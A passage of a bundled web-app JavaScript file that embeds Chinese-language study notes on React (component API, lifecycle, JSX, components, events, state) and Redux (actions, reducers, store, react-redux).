API\r\n\r\n- 设置状态：setState\r\n\r\n\t- setState(object nextState[, function callback])\r\n\r\n\t\t- nextState，将要设置的新状态，该状态会和当前的state合并\r\n\t\t- callback，可选参数，回调函数。该函数会在setState设置成功，且组件重新渲染后调用。\r\n\t\t- 合并nextState和当前state，并重新渲染组件。setState是React事件处理函数中和请求回调函数中触发UI更新的主要方法。\r\n\t\t- 关于setState\r\n\r\n\t\t\t- 不能在组件内部通过this.state修改状态，因为该状态会在调用setState()后被替换。\r\n\t\t\t- setState()并不会立即改变this.state，而是创建一个即将处理的state。setState()并不一定是同步的，为了提升性能React会批量执行state和DOM渲染。\r\n\t\t\t- setState()总是会触发一次组件重绘，除非在shouldComponentUpdate()中实现了一些条件渲染逻辑。\r\n\r\n- 替换状态：replaceState\r\n\r\n\t- replaceState(object nextState[, function callback])\r\n\r\n\t\t- nextState，将要设置的新状态，该状态会替换当前的state。\r\n\t\t- callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。\r\n\t\t- replaceState()方法与setState()类似，但是方法只会保留nextState中状态，原state不在nextState中的状态都会被删除。\r\n\r\n- 设置属性：setProps\r\n\r\n\t- setProps(object nextProps[, function callback])\r\n\r\n\t\t- nextProps，将要设置的新属性，该状态会和当前的props合并\r\n\t\t- callback，可选参数，回调函数。该函数会在setProps设置成功，且组件重新渲染后调用。\r\n\t\t- props相当于组件的数据流，它总是会从父组件向下传递至所有的子组件中。\r\n\t\t- 当和一个外部的JavaScript应用集成时，我们可能会需要向组件传递数据或通知React.render()组件需要重新渲染，可以使用setProps()。\r\n\r\n更新组件，我可以在节点上再次调用React.render()，也可以通过setProps()方法改变组件属性，触发组件重新渲染。\r\n\r\n- 替换属性：replaceProps\r\n\r\n\t- replaceProps(object nextProps[, function callback])\r\n\r\n\t\t- nextProps，将要设置的新属性，该属性会替换当前的props。\r\n\t\t- callback，可选参数，回调函数。该函数会在replaceProps设置成功，且组件重新渲染后调用。\r\n\t\t- replaceProps()方法与setProps类似，但它会删除原有props\r\n\r\n- 强制更新：forceUpdate\r\n\r\n\t- forceUpdate([function callback])\r\n\r\n\t\t- callback，可选参数，回调函数。该函数会在组件render()方法调用后调用。\r\n\t\t- forceUpdate()方法会使组件调用自身的render()方法重新渲染组件，组件的子组件也会调用自己的render()。但是，组件重新渲染时，依然会读取this.props和this.state，如果状态没有改变，那么React只会更新DOM。\r\n\r\nforceUpdate()方法适用于this.props和this.state之外的组件重绘（如：修改了this.state后），通过该方法通知React需要调用render()\r\n\r\n一般来说，应该尽量避免使用forceUpdate()，而仅从this.props和this.state中读取状态并由React触发render()调用。\r\n\r\n- 获取DOM节点：findDOMNode\r\n\r\n\t- DOMElement findDOMNode()\r\n\r\n\t\t- 返回值：DOM元素DOMElement\r\n\r\n\t\t\t- 如果组件已经挂载到DOM中，该方法返回对应的本地浏览器 DOM 元素。当render返回null 或 false时，\r\nthis.findDOMNode()也会返回null。从DOM 中读取值的时候，该方法很有用，如：获取表单字段的值和做一些 DOM 操作。\r\n\r\n- 判断组件挂载状态：isMounted\r\n\r\n\t- bool isMounted()\r\n\r\n\t\t- 返回值：true或false，表示组件是否已挂载到DOM中\r\n\r\n\t\t\t- isMounted()方法用于判断组件是否已挂载到DOM中。可以使用该方法保证了setState()和forceUpdate()在异步场景下的调用不会出错。\r\n\r\n### React 组件生命周期\r\n\r\n- React 组件的生命周期函数，又叫钩子函数，它能响应不同的状态。\r\n\r\n\t- 组件的生命周期可分成三个状态：\r\n\r\n\t\t- Mounting：已插入真实 DOM\r\n\t\t- Updating：正在被重新渲染\r\n\t\t- Unmounting：已移出真实 DOM\r\n\r\n\t- 生命周期的方法有：\r\n\r\n\t\t- componentWillMount 在渲染前调用,在客户端也在服务端。\r\n\t\t- componentDidMount : 在第一次渲染后调用，只在客户端。之后组件已经生成了对应的DOM结构，可以通过this.getDOMNode()来进行访问。\r\n 如果你想和其他JavaScript框架一起使用，可以在这个方法中调用setTimeout, setInterval或者发送AJAX请求等操作(防止异部操作阻塞UI)。\r\n\t\t- componentWillReceiveProps 在组件接收到一个新的prop时被调用。这个方法在初始化render时不会被调用。\r\n\t\t- shouldComponentUpdate 返回一个布尔值。在组件接收到新的props或者state时被调用。在初始化时或者使用forceUpdate时不被调用。 \r\n可以在你确认不需要更新组件时使用。\r\n\t\t- componentWillUpdate在组件接收到新的props或者state但还没有render时被调用。在初始化时不会被调用。\r\n\t\t- componentDidUpdate 在组件完成更新后立即调用。在初始化时不会被调用。\r\n\t\t- componentWillUnmount在组件从 DOM 中移除的时候立刻被调用。\r\n\r\n### React AJAX\r\n\r\n- React 组件的数据可以通过 componentDidMount 方法中的 Ajax 来获取，当从服务端获取数据库可以将数据存储在 state 中，再用 this.setState 方法重新渲染 UI。\r\n- 当使用异步加载数据时，在组件卸载前使用 componentWillUnmount 来取消未完成的请求。\r\n\r\n### React Refs\r\n\r\n- React 支持一种非常特殊的属性 Ref ，你可以用来绑定到 render() 输出的任何组件上。\r\n- 这个特殊的属性允许你引用 render() 返回的相应的支撑实例（ backing instance ）。这样就可以确保在任何时间总是拿到正确的实例。\r\n- ref 属性的值可以是一个字符串也可以是一个函数。\r\n- 使用方法\r\n\r\n\t- 绑定一个 ref 属性到 render 的返回值上：\r\n\r\n\t\t- <input ref=\"myInput\" />\r\n\r\n\t\t\t- 在其它代码中，通过 this.refs 获取支撑实例:\r\n\r\n\t\t\t\t- var input = this.refs.myInput;\r\nvar inputValue = input.value;\r\nvar inputRect = input.getBoundingClientRect();\r\n\r\n## Redux\r\n\r\n### 三个基本原则\r\n\r\n- 整个应用只有唯一一个可信数据源，也就是只有一个 Store\r\n- State 只能通过触发 Action 来更改\r\n- State 的更改必须写成纯函数，也就是每次更改总是返回一个新的 State，在 Redux 里这种函数称为 Reducer\r\n\r\n### Actions\r\n\r\n- Action 很简单，就是一个单纯的包含 { type, payload } 的对象，type 是一个常量用来标示动作类型，payload 是这个动作携带的数据。Action 需要通过 store.dispatch() 方法来发送。\r\n\r\n\t- 比如一个最简单的 action：\r\n\r\n\t\t- {\r\n  type: 'ADD_TODO',\r\n  text: 'Build my first Redux app'\r\n}\r\n\r\n\t- 一般来说，会使用函数（Action Creators）来生成 action，这样会有更大的灵活性，Action Creators 是一个 pure function，它最后会返回一个 action 对象：\r\n\r\n\t\t- function addTodo(text) {\r\n  return {\r\n    type: 'ADD_TODO',\r\n    text\r\n  }\r\n}\r\n\t\t- 所以现在要触发一个动作只要调用 dispatch: dispatch(addTodo(text))\r\n稍后会讲到如何拿到 store.dispatch\r\n\r\n### Reducers\r\n\r\n- Reducer 用来处理 Action 触发的对状态树的更改。\r\n- 所以一个 reducer 函数会接受 oldState 和 action 两个参数，返回一个新的 state：(oldState, action) => newState。一个简单的 reducer 可能类似这样：\r\n\r\n\t- const initialState = {\r\n  a: 'a',\r\n  b: 'b'\r\n};\r\n\r\nfunction someApp(state = initialState, action) {\r\n  switch (action.type) {\r\n    case 'CHANGE_A':\r\n      return { ...state, a: 'Modified a' };\r\n    case 'CHANGE_B':\r\n      return { ...state, b: action.payload };\r\n    default:\r\n      return state\r\n  }\r\n}\r\n\t- 值得注意的有两点：\r\n\r\n\t\t- 我们用到了 object spread 语法 确保不会更改到 oldState 而是返回一个 newState\r\n\t\t- 对于不需要处理的 action，直接返回 oldState\r\n\r\n- Reducer 也是 pure function，这点非常重要，所以绝对不要在 reducer 里面做一些引入 side-effects 的事情，比如：\r\n\r\n\t- 直接修改 state 参数对象\r\n\t- 请求 API\r\n\t- 调用不纯的函数，比如 Data.now() Math.random()\r\n\r\n- 因为 Redux 里面只有一个 Store，对应一个 State 状态，所以整个 State 对象就是由一个 reducer 函数管理，但是如果所有的状态更改逻辑都放在这一个 reducer 里面，显然会变得越来越巨大，越来越难以维护。得益于纯函数的实现，我们只需要稍微变通一下，让状态树上的每个字段都有一个 reducer 函数来管理就可以拆分成很小的 reducer 了：\r\n\r\n\t- function someApp(state = {}, action) {\r\n  return {\r\n    a: reducerA(state.a, action),\r\n    b: reducerB(state.b, action)\r\n  };\r\n}\r\n\t- Redux 提供了一个工具函数 combineReducers 来简化这种 reducer 合并：\r\n\r\n\t\t- import { combineReducers } from 'redux';\r\n\r\nconst someApp = combineReducers({\r\n  a: reducerA,\r\n  b: reducerB\r\n});\r\n\r\n### Store\r\n\r\n- 现在有了 Action 和 Reducer，Store 的作用就是连接这两者，Store 的作用有这么几个：\r\n\r\n\t- Hold 住整个应用的 State 状态树\r\n\t- 提供一个 getState() 方法获取 State\r\n\t- 提供一个 dispatch() 方法发送 action 更改 State\r\n\t- 提供一个 subscribe() 方法注册回调函数监听 State 的更改\r\n\r\n- 创建一个 Store 很容易，将 root reducer 函数传递给 createStore 方法即可：\r\n\r\n\t- import { createStore } from 'redux';\r\nimport someApp from './reducers';\r\nlet store = createStore(someApp);\r\n\r\n// 你也可以额外指定一个初始 State（initialState），这对于服务端渲染很有用\r\n// let store = createStore(someApp, window.STATE_FROM_SERVER);\r\n\r\n\t\t- 现在我们就拿到了 store.dispatch，可以用来分发 action 了：\r\n\r\n\t\t\t- let unsubscribe = store.subscribe(() => console.log(store.getState()));\r\n\r\n// Dispatch\r\nstore.dispatch({ type: 'CHANGE_A' });\r\nstore.dispatch({ type: 'CHANGE_B', payload: 'Modified b' });\r\n\r\n// Stop listening to state updates\r\nunsubscribe();\r\n\r\n### Data Flow\r\n\r\n- 以上提到的 store.dispatch(action) -> reducer(state, action) -> store.getState() 其实就构成了一个“单向数据流”，我们再来总结一下。\r\n\r\n\t- 1. 调用 store.dispatch(action)\r\n\r\n\t\t- Action 是一个包含 { type, payload } 的对象，它描述了“发生了什么”，比如：\r\n\r\n\t\t\t- { type: 'LIKE_ARTICLE', articleID: 42 }\r\n{ type: 'FETCH_USER_SUCCESS', response: { id: 3, name: 'Mary' } }\r\n{ type: 'ADD_TODO', text: 'Read the Redux docs.' }\r\n\r\n\t\t- 你可以在任何地方调用 store.dispatch(action)，比如组件内部，Ajax 回调函数里面等等。\r\n\r\n\t- 2. Action 会触发给 Store 指定的 root reducer\r\n\r\n\t\t- root reducer 会返回一个完整的状态树，State 对象上的各个字段值可以由各自的 reducer 函数处理并返回新的值。\r\n\r\n\t\t\t- reducer 函数接受 (state, action) 两个参数\r\n\t\t\t- reducer 函数判断 action.type 然后处理对应的 action.payload 数据来更新并返回一个新的 state\r\n\r\n\t- 3. Store 会保存 root reducer 返回的状态树\r\n\r\n\t\t- 新的 State 会替代旧的 State，然后所有 store.subscribe(listener) 注册的回调函数会被调用，在回调函数里面可以通过 store.getState() 拿到新的 State。\r\n\r\n### 在 React 应用中使用 Redux\r\n\r\n- 和 Flux 类似，Redux 也是需要注册一个回调函数 store.subscribe(listener) 来获取 State 的更新，然后我们要在 listener 里面调用 setState() 来更新 React 组件。\r\nRedux 官方提供了 react-redux 来简化 React 和 Redux 之间的绑定，不再需要像 Flux 那样手动注册／解绑回调函数。\r\n- <Provider>\r\n\r\n\t- <Provider> 作为一个容器组件，用来接受 Store，并且让 Store 对子组件可用，用法如下：\r\n\r\n\t\t- import { render } from 'react-dom';\r\nimport { Provider } from 'react-redux';\r\nimport App from './app';\r\n\r\nrender(\r\n  <Provider store={store}>\r\n    <App />\r\n  </Provider>,\r\n  document.getElementById('root')\r\n);\r\n\t\t- 这时候 <Provider> 里面的子组件 <App /> 才可以使用 connect 方法关联 store。\r\n\t\t- <Provider> 的实现很简单，他利用了 React 一个（暂时）隐藏的特性 Contexts，Context 用来传递一些父容器的属性对所有子孙组件可见，在某些场景下面避免了用 props 传递多层组件的繁琐，\r\n\r\n- Connect\r\n\r\n\t- connect() 这个方法略微复杂一点，主要是因为它的用法非常灵活：connect([mapStateToProps], mapDispatchToProps], [mergeProps], [options])，它最多接受4个参数，都是可选的，并且这个方法调用会返回另一个函数，这个返回的函数来接受一个组件类作为参数，最后才返回一个和 Redux store 关联起来的新组件，类似这样：\r\n\r\n\t\t- class App extends Component { ... }\r\n\r\nexport default connect()(App);\r\n\r\n\t\t\t- 这样就可以在 App 这个组件里面通过 props 拿到 Store 的 dispatch 方法，但是注意现在的 App 没有监听 Store 的状态更改，如果要监听 Store 的状态更改，必须要指定 mapStateToProps 参数。\r\n\r\n\t\t\t\t- [mapStateToProps(state, [ownProps]): stateProps]: 第一个可选参数是一个函数，只有指定了这个参数，这个关联（connected）组件才会监听 Redux Store 的更新，每次更新都会调用 mapStateToProps 这个函数，返回一个字面量对象将会合并到组件的 props 属性。 ownProps 是可选的第二个参数，它是传递给组件的 props，当组件获取到新的 props 时，ownProps 都会拿到这个值并且执行 mapStateToProps 这个函数。\r\n\t\t\t\t- [mapDispatchProps(dispatch, [ownProps]): dispatchProps]: 这个函数用来指定如何传递 dispatch 给组件，在这个函数里面直接 dispatch action creator，返回一个字面量对象将会合并到组件的 props 属性，这样关联组件可以直接通过 props 调用到 action， Redux 提供了一个 bindActionCreators() 辅助函数来简化这种写法。 如果省略这个参数，默认直接把 dispatch 作为 props 传入。ownProps 作用同上。\r\n\r\n",oi={data:function(){return{MainComponent:si}}},li=oi,ci=Object(u["a"])(li,ai,ii,!1,null,"38db8563",null),pi=ci.exports,ui=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}})],1)},mi=[],di="\x3c!--\n * @Date           : 2021-05-05 03:45:03\n * @FilePath       : /jinnian-space/src/pages/web/react/md/react基础Day01-React概述&脚手架搭建&JSX&组件.md\n * @Description    : \n--\x3e\n\n\n# React基础知识点\n\n## 目标\n\n- 能够说出React是什么\n- 能够说出React的特点\n- 能够掌握React的基本使用\n- 能够使用React脚手架\n\n## 什么是React （★★★）\n\nReact是一个用于构建用户界面的javaScript库，起源于facebook的内部项目，后续在13年开源了出来\n\n### 特点\n\n- 声明式\n\n你只需要描述UI看起来是什么样式，就跟写HTML一样，React负责渲染UI\n\n- 基于组件\n\n组件时React最重要的内容，组件表示页面中的部分内容\n\n- 学习一次，随处使用\n\n使用React可以开发Web应用，使用React可以开发移动端，可以开发VR应用\n\n## React基本使用\n\n### React的安装\n\nnpm i react react-dom \n\n- react 包是核心，提供创建元素，组件等功能\n- react-dom 包提供DOM相关功能\n\n### React的使用\n\n- 引入react和react-dom的两个js文件\n\n```html\n<script src=\"./node_modules/react/umd/react.development.js\"><\/script>\n<script src=\"./node_modules/react-dom/umd/react-dom.development.js\"><\/script>\n```\n\n- 创建React元素\n\n```javascript\n// 创建元素节点\n// 1. 元素名称\n// 2. 元素属性 传递的是个对象\n// 3. 元素内容\nlet title = React.createElement('li', null, 'hellow react');\n```\n\n- 渲染到页面\n\n```javascript\n// 渲染到页面\nReactDOM.render(title, root)\n```\n\n## React脚手架（★★★）\n\n### React脚手架意义\n\n- 脚手架是开发现代Web应用的必备\n- 充分利用 Webpack，Babel，ESLint等工具辅助项目开发\n- 零配置，无需手动配置繁琐的工具即可使用\n- 关注业务，而不是工具配置\n\n### 使用React脚手架初始化项目\n\n- 初始化项目，命令： npx create-react-app my-pro\n  - npx 目的：提升包内提供的命令行工具的使用体验\n  - 原来：先安装脚手架包，再使用这个包中提供的命令\n  - 现在：无需安装脚手架包，就可以直接使用这个包提供的命令\n  - create-react-app  这个是脚手架名称 不能随意更改\n  - my-pro  自己定义的项目名称\n- 启动项目，在项目根目录执行命令： npm start\n\nyarn命令简介\n\n- yarn 是Facebook发布的包管理器，可以看做是npm的替代品，功能与npm相同\n- yarn具有快速，可靠和安全的特点\n- 初始化新项目：yarn init\n- 安装包： yarn add 包名称\n- 安装项目依赖： yarn\n\n### 脚手架中使用React\n\n- 导入react和react-dom两个包\n\n```react\nimport React from 'react'\nimport ReactDOM from 'react-dom'\n```\n\n- 创建元素\n\n```react\nlet h1 = React.createElement('h1',null,'我是标题')\n```\n\n- 渲染到页面\n\n```react\nReactDOM.render(h1,document.getElementById('root'))\n```\n\n# JSX的使用\n\n## 目标\n\n- 知道什么是JSX\n- 能够使用JSX创建React元素\n- 能够在JSX中使用JavaScript表达式\n- 能够使用JSX的条件渲染和列表渲染\n- 能够给JSX添加样式\n\n## 概述\n\n#### JSX产生的原因\n\n由于通过createElement()方法创建的React元素有一些问题，代码比较繁琐，结构不直观，无法一眼看出描述的结构，不优雅，用户体验不爽\n\n#### JSX的概述\n\nJSX是JavaScript XML 的简写，表示在JavaScript代码中写HTML格式的代码\n\n优势：声明式语法更加直观，与HTML结构相同，降低了学习成本，提升开发效率\n\n## 简单入门使用（★★★）\n\n#### 使用步骤\n\n- 使用JSX语法创建react元素\n\n```react\nlet h1 = <h1>我是通过JSX创建的元素</h1>\n```\n\n- 使用ReactDOM来渲染元素\n\n```react\nReactDOM.render(h1,document.getElementById('root'))\n```\n\n#### 为什么在脚手架中可以使用JSX语法\n\n- JSX 不是标准的ECMAScript语法，它是ECMAScript的语法拓展\n- 需要使用babel编译处理后，才能在浏览器环境中使用\n- create-react-app脚手架中已经默认有该配置，无需手动配置\n- 编译JSX语法的包： @bable/preset-react\n\n#### 注意点\n\n- React元素的属性名使用驼峰命名法\n- 特殊属性名：class -> className，for -> htmlFor，tabindex -> tabIndex\n- 如果没有子节点的React元素可以用 `/>` 来结束\n- 推荐：使用 小括号包裹JSX，从而避免JS中自动插入分号报错\n\n## JSX语法（★★★）\n\nJSX是来描述页面的结构，我们一般在编写业务逻辑渲染页面的时候，需要涉及到传递值，调用函数，判断条件，循环等，这一些在JSX中都能得到支持\n\n#### 嵌入JS表达式\n\n语法：{JavaScritp表达式}\n\n \n\n##### 注意点\n\n- 只要是合法的js表达式都可以进行嵌入\n- JSX自身也是js表达式\n- 注意：js中的对象是一个例外，一般只会出现在style属性中\n- 注意：在{}中不能出现语句\n\n#### 条件渲染\n\n根据不同的条件来渲染不同的JSX结构\n\n```react\nlet isLoading = true\nlet loading = ()=>{\n    if(isLoading){\n        return <div>Loading...</div>\n    }\n    return <div>加载完成</div>\n}\n```\n\n可以发现，写JSX的条件渲染与我们之前编写代码的逻辑是差不多的，根据不同的判断逻辑，返回不同的 JSX结构，然后渲染到页面中\n\n#### 列表渲染\n\n- 如果需要渲染一组数据，我们应该使用数组的 map () 方法\n- 注意：渲染列表的时候需要添加key属性，key属性的值要保证唯一\n- 原则：map()遍历谁，就给谁添加key属性\n- 注意：尽量避免使用索引号作为key\n\n```react\nlet arr = [{\n    id:1,\n    name:'三国演义'\n},{\n    id:2,\n    name:'水浒传'\n},{\n    id:3,\n    name:'西游记'\n},{\n    id:4,\n    name:'红楼梦'\n}]\nlet ul = (<ul>\n    {arr.map(item => <li key={item.id}>{item.name}</li>)}\n</ul>)\nReactDOM.render(ul,document.getElementById('root'))\n```\n\n#### 样式处理\n\n##### 行内样式 -style\n\n在style里面我们通过对象的方式传递数据\n\n```react\n<li key={item.id} style={{'color': 'red',\"backgroundColor\": 'pink'}}>{item.name}</li>\n```\n\n这种方式比较的麻烦，不方便进行阅读，而且还会导致代码比较的繁琐\n\n##### 类名 -className\n\n创建CSS文件编写样式代码\n\n```css\n.container {\n    text-align: center\n}\n```\n\n在js中进行引入，然后设置类名即可\n\n```react\nimport './css/index.css'\n\n<li className='container' key={item.id} style={{'color': 'red',\"backgroundColor\": 'pink'}}>{item.name}</li>\n```\n\n### 小结\n\n\n \n\n```react\n/*\n * @Date           : 2021-05-05 04:14:10\n * @FilePath       : /app-demo-1/src/view/view1.js\n * @Description    : \n */\nimport React from \"react\"\nimport Tset1 from  \"../components/Test1\"\nconst classes666={\n    root:{\n    },\n    red:{\n        color:\"red\",\n        backgroundColor:\"#ccc\"\n    }\n}\nconst name1='66sxsx999999'\nconst div2= <h3>KKKKKKKKKKKKKK</h3>\nconst list1=[\n    { label: \"react\", value: \"m1\" },\n    { label: \"基础\", value: \"m2\" },\n]\n// {} 中 不能写 对象表达式 if 等表达式\nconst nn=5\nconst  say1 = ()=>{\n    if(nn>5){\n        return (  <div> 大于5</div> )\n    }else{\n        return (  <div> 小于等于5</div> )  \n    }\n}\n\n\nclass Hello extends React.Component{\n    render(){\n        return <div> HELLO   类方法 组件</div>\n    }\n}\n\nfunction View1(){\n    return (\n        <div>\n            <h1 className=\"classesxsx666\">我 {name1} 带你.......{classes666.red.color}...........</h1>\n            <div>{say1()}</div>\n            <div>{div2}</div>\n            <Tset1/>\n            <div  style={classes666.red}>\n                {  list1.map(x=><div key={x.label}>{x.label}----------{x.value}</div>)}\n            </div>\n            <div><Hello/></div>\n        </div>\n    )\n}\nexport default View1;\n```\n\n- JSX是React的核心内容\n- JSX表示在JS代码中写HTML结构，是React声明式的体现\n- 使用JSX配合嵌入的JS表达式、条件渲染、列表渲染、可以描述任意UI结构\n- 推荐使用className的方式给JSX添加样式\n- React完全利用JS语言自身的能力来编写UI，而不是造轮子增强HTML功能\n\n# React组件\n\n## 目标\n\n- 能够使用函数创建组件\n- 能够使用class创建组件\n- 能够给React元素绑定事件\n- 能够使用state和setState()\n- 能够处理事件中的this指向问题\n\n## React组件介绍\n\n- 组件是React的一等公民，使用React就是在用组件\n- 组件表示页面中的部分功能\n- 组合多个组件实现完整的页面功能\n- 特点：可复用、独立、可组合\n\n![](./img/web/react/react基础Day01-React概述&脚手架搭建&JSX&组件/组件.png)\n\n## 组件的创建方式\n\n### 函数创建组件\n\n- 函数组件：使用JS的函数创建组件\n- **约定1：**函数名称必须以大写字母开头\n- **约定2：**函数组件必须有返回值，表示该组件的结构\n- 如果返回值为null，表示不渲染任何内容\n\n#### 示例demo\n\n编写函数组件\n\n```react\nfunction Hello() {\n    return (\n        <div>这是第一个函数组件</div>\n    )\n}\n```\n\n利用ReactDOM.render()进行渲染\n\n```react\nReactDOM.render(<Hello />,document.getElementById('root'))\n```\n\n### 类组件（★★★）\n\n- 使用ES6语法的class创建的组件\n- 约定1：类名称也必须要大写字母开头\n- 约定2：类组件应该继承React.Component父类，从而可以使用父类中提供的方法或者属性\n- 约定3：类组件必须提供 render 方法\n- 约定4：render方法中必须要有return返回值\n\n#### 示例demo\n\n创建class类，继承React.Component，在里面提供render方法，在return里面返回内容\n\n```react\nclass Hello extends React.Component{\n    render(){\n        return (\n            <div>这是第一个类组件</div>\n        )\n    }\n}\n```\n\n通过ReactDOM进行渲染\n\n```react\nReactDOM.render(<Hello />,document.getElementById('root'))\n```\n\n### 抽离成单独的JS文件（★★★）\n\n- 思考：项目中组件多了之后，该如何组织这些组件？\n- 选择一：将所有的组件放在同一个JS文件中\n- 选择二：将每个组件放到单独的JS文件中\n- **组件作为一个独立的个体，一般都会放到一个单独的JS文件中**\n\n#### 示例demo\n\n- 创建Hello.js\n- 在Hello.js 中导入React，创建组件，在Hello.js中导出\n\n```react\nimport React from 'react'\n\nexport default class extends React.Component {\n    render(){\n        return (\n            <div>单独抽离出来的 Hello</div>\n        )\n    }\n}\n```\n\n- 在index.js中导入Hello组件，渲染到页面\n\n```react\nimport Hello from './js/Hello'\nReactDOM.render(<Hello />,document.getElementById('root'))\n```\n\n## React事件处理（★★★）\n\n### 事件绑定\n\n- React事件绑定语法与DOM事件语法相似\n- 语法：on+事件名称=事件处理函数，比如  onClick = function(){}\n- 注意：React事件采用驼峰命名法\n\n#### 示例demo\n\n```react\nexport default class extends React.Component {\n    clickHandle(e){\n        console.log('点了')\n    }\n    render(){\n        return (\n            <div><button onClick = {this.clickHandle}>点我点我点我</button></div>\n        )\n    }\n}\n```\n\n#### 小结\n\n- 在React中绑定事件与原生很类似\n- 需要注意点在于，在React绑定事件需要遵循驼峰命名法\n- 类组件与函数组件绑定事件是差不多的，只是在类组件中绑定事件函数的时候需要用到this，代表指向当前的类的引用，在函数中不需要调用this\n\n### 事件对象\n\n- 可以通过事件处理函数的参数获取到事件对象\n- React中的事件对象叫做：合成事件\n- 合成事件：兼容所有浏览器，无需担心跨浏览器兼容问题\n- 除兼容所有浏览器外，它还拥有和浏览器原生事件相同的接口，包括 `stopPropagation()`和 `preventDefault()`\n- 如果你想获取到原生事件对象，可以通过 `nativeEvent` 属性来进行获取\n\n#### 示例demo\n\n```react\nexport default class extends React.Component {\n    clickHandle(e){\n        // 获取原生事件对象\n        console.log(e.nativeEvent)\n    }\n    render(){\n        return (\n            <div><button onClick = {this.clickHandle}>点我点我点我</button></div>\n        )\n    }\n}\n```\n\n### 支持的事件（有兴趣的课下去研究）\n\n- Clipboard Events  剪切板事件\n\n  - 事件名 ：onCopy onCut onPaste\n  - 属性     ：DOMDataTransfer clipboardData\n\n- compositionEvent  复合事件\n\n  - 事件名： onCompositionEnd onCompositionStart onCompositionUpdate\n  - 属性： string data\n\n- Keyboard Events  键盘事件\n\n  - 事件名：onKeyDown onKeyPress onKeyUp\n  - 属性： 例如 number keyCode  太多就不一一列举\n\n- Focus Events  焦点事件  （这些焦点事件在 React DOM 上的所有元素都有效，不只是表单元素）\n\n  - 事件名： onFocus onBlur\n  - 属性： DOMEventTarget relatedTarget\n\n- Form Events  表单事件\n\n  - 事件名： onChange onInput onInvalid onSubmit\n\n- Mouse Events  鼠标事件\n\n  - 事件名：\n\n    ```react\n    onClick onContextMenu onDoubleClick onDrag onDragEnd onDragEnter onDragExit\n    onDragLeave onDragOver onDragStart onDrop onMouseDown onMouseEnter onMouseLeave\n    onMouseMove onMouseOut onMouseOver onMouseUp\n    ```\n\n- Pointer Events  指针事件\n\n  - 事件名：\n\n    ```react\n    onPointerDown onPointerMove onPointerUp onPointerCancel onGotPointerCapture\n    onLostPointerCapture onPointerEnter onPointerLeave onPointerOver onPointerOut\n    ```\n\n- Selection Events  选择事件\n\n  - 事件名：onSelect\n\n- Touch Events  触摸事件\n\n  - 事件名：onTouchCancel onTouchEnd onTouchMove onTouchStart\n\n- UI Events  UI 事件\n\n  - 事件名： onScroll\n\n- Wheel Events  滚轮事件\n\n  - 事件名：onWheel\n\n  - 属性： \n\n    ```react\n    number deltaMode\n    number deltaX\n    number deltaY\n    number deltaZ\n    ```\n\n- Media Events  媒体事件\n\n  - 事件名：\n\n    ```react\n    onAbort onCanPlay onCanPlayThrough onDurationChange onEmptied onEncrypted\n    onEnded onError onLoadedData onLoadedMetadata onLoadStart onPause onPlay\n    onPlaying onProgress onRateChange onSeeked onSeeking onStalled onSuspend\n    onTimeUpdate onVolumeChange onWaiting\n    ```\n\n- Image Events 图像事件\n\n  - 事件名：onLoad onError\n\n- Animation Events 动画事件\n\n  - 事件名：onAnimationStart onAnimationEnd onAnimationIteration\n\n- Transition Events 过渡事件\n\n  - 事件名：onTransitionEnd\n\n- Other Events  其他事件\n\n  - 事件名： onToggle\n\n## 有状态组件和无状态组件\n\n- 函数组件又叫做 无状态组件，类组件又叫做 有状态组件\n- 状态(state) 即数据\n- 函数组件没有自己的状态，只负责数据展示\n- 类组件有自己的状态，负责更新UI，让页面动起来\n\n![](./img/web/react/react基础Day01-React概述&脚手架搭建&JSX&组件/状态.png)\n\n## State和SetState（★★★）\n\n### state基本使用\n\n- 状态(state)即数据，是组件内部的私有数据，只能在组件内部使用\n- state的值是对象，表示一个组件中可以有多个数据\n- 通过this.state来获取状态\n\n#### 示例demo\n\n```react\nexport default class extends React.Component {\n    constructor(){\n        super()\n\n        // 第一种初始化方式\n        this.state = {\n            count : 0\n        }\n    }\n    // 第二种初始化方式\n    state = {\n        count:1\n    }\n    render(){\n        return (\n            <div>计数器 :{this.state.count}</div>\n        )\n    }\n}\n```\n\n### setState() 修改状态\n\n- 状态是可变的\n- 语法：this.setState({要修改的数据})\n- **注意：不要直接修改state中的值，这是错误的**\n- setState() 作用：1.修改 state 2.更新UI\n- 思想：数据驱动视图\n\n![](./img/web/react/react基础Day01-React概述&脚手架搭建&JSX&组件/修改状态.png)\n\n#### 示例demo\n\n```react\nexport default class extends React.Component {\n    // 第二种初始化方式\n    state = {\n        count:1\n    }\n    render(){\n        return (\n            <div>\n                <div>计数器 :{this.state.count}</div>\n                <button onClick={() => {\n                     this.setState({\n            \t \t\tcount: this.state.count+1\n           \t\t\t  })   \n                }}>+1</button>\n            </div>\n        )\n    }\n}\n```\n\n#### 小结\n\n- 修改state里面的值我们需要通过 this.setState() 来进行修改\n- React底层会有监听，一旦我们调用了setState导致了数据的变化，就会重新调用一次render方法，重新渲染当前组件\n\n### 抽取事件处理函数\n\n- 当我们把上面代码的事件处理程序抽取出来后，会报错，找不到this\n\n![](./img/web/react/react基础Day01-React概述&脚手架搭建&JSX&组件/this找不到.png)\n\n#### 原因\n\n- 在JSX中我们写的事件处理函数可以找到this，原因在于在JSX中我们利用箭头函数，箭头函数是不会绑定this，所以会向外一层去寻找，外层是render方法，在render方法里面的this刚好指向的是当前实例对象\n\n## 事件绑定this指向\n\n### 箭头函数\n\n- 利用箭头函数自身不绑定this的特点\n\n![](./img/web/react/react基础Day01-React概述&脚手架搭建&JSX&组件/箭头函数.png)\n\n### 利用bind方法（★★★）\n\n利用原型bind方法是可以更改函数里面this的指向的，所以我们可以在构造中调用bind方法，然后把返回的值赋值给我们的函数即可\n\n```react\nclass App extends React.Component {\n  constructor() {\n    super()\n\t...\n    // 通过bind方法改变了当前函数中this的指向\n    this.onIncrement = this.onIncrement.bind(this)\n  }\n  // 事件处理程序\n  onIncrement() {\n    ...\n  }\n\n  render() {\n    ...\n  }\n}\n```\n\n### class的实例方法（★★★）\n\n- 利用箭头函数形式的class实例方法\n- 注意：该语法是实验性语法，但是，由于babel的存在可以使用\n\n```react\n  // 事件处理程序\n  onIncrement = () => {\n    console.log('事件处理程序中的this：', this)\n    this.setState({\n      count: this.state.count + 1\n    })\n  }\n```\n\n### 小结\n\n- 推荐：使用class的实例方法，也是依赖箭头函数不绑定this的原因",gi="\x3c!--\n * @Date           : 2021-05-05 